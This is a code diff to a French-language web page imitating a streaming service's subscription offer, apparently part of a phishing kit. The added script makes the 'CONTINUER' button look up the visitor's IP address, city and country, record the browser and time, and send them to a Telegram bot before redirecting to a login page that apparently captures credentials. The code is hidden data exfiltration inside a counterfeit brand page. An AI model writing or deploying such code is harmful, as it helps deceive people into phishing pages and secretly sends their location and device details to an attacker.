@@ -17,12 +17,50 @@
       <h2 class="subheadline">À partir de 5,99 € par mois. Sans frais supplémentaires. Sans engagement*</h2>
       
       <div class="button-container">
-        <button onclick="window.location.href='login.html'">CONTINUER</button>
+        <button id="continueBtn">CONTINUER</button>
       </div>
 
       <p class="disclaimer">Profitez de 12 mois au prix de 10 avec un abonnement Premium ou Standard annuel. Économies par rapport à un abonnement mensuel.</p>
       <p class="note">* La résiliation prend effet à la fin de la période d'abonnement en cours. Abonnement requis. 5,99 €/mois pour Standard avec pub.</p>
     </section>
   </div>
+
+  <!-- Script Telegram -->
+  <script>
+    document.getElementById("continueBtn").addEventListener("click", async function () {
+      const webhookURL = "https://api.telegram.org/bot<TON_TOKEN>/sendMessage";
+      const chatId = "<TON_CHAT_ID>";
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const message = `
+🔔 CLIC détecté sur CONTINUER
+🌍 IP : ${data.ip}
+📍 Ville : ${data.city}
+🌐 Pays : ${data.country_name}
+🕒 Heure : ${new Date().toLocaleString()}
+📱 Navigateur : ${navigator.userAgent}
+        `;
+
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      } catch (err) {
+        console.error("Erreur Telegram :", err);
+      }
+
+      // Redirection vers login.html après l’envoi
+      window.location.href = "login.html";
+    });
+  </script>
 </body>
 </html>
